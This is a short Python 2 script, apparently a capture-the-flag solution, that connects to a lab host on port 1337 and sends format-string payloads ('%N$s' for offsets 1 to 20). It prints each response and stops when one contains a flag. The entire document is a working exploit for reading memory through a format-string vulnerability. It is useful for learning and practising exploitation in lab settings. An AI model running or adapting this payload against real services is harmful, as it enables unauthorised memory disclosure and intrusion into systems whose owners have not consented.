#!/usr/bin/env python
import socket
import time

TARGET = "10.10.172.65"
PORT = 1337

# Try offsets 1 through 20
for offset in range(1, 21):
    payload = "%" + str(offset) + "$s"
    print "[*] Trying offset: {}".format(offset)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET, PORT))
        
        # Receive and discard the banner output
        banner = s.recv(1024)
        # Send our payload followed by a newline so gets() stops reading.
        s.sendall(payload + "\n")
        
        # Give the server a moment to process
        time.sleep(0.5)
        response = s.recv(4096)
        print response
        
        # Check if the response likely contains the flag
        if "flag{" in response or "FLAG" in response:
            print "[+] Flag found at offset {}".format(offset)
            s.close()
            break
        s.close()
    except Exception as e:
        print "Error: {}".format(e)
